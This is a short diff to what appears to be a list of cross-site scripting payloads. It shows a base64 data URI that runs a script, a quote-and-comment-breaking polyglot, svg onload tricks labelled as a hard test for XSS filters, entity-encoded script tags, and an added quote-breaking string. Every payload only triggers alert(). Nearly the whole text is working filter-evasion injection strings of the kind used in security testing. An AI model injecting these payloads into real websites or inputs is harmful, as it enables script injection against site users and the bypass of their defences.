@@ -21,7 +21,9 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgiYnkgc3RydWt0Iik8L3NjcmlwdD4=  //alert(
 
 ';alert(1)//';alert(1)//";alert(1)//";alert(1)//--></SCRIPT>">'><SCRIPT>alert(1)</SCRIPT>
 
-<svg </onload ="1> (_=alert,_(1337)) ""> // Hard test for XSS filters
+<svg </onload ="1> (_=alert,_(1337)) ""> 
+
+"xxxxxxxx'yyyyy</img 
 
 <svg><x><script>alert&#40;1&#41</x>
 <svg><x><script>alert&#40;&#39;1&#39;&#41</x>
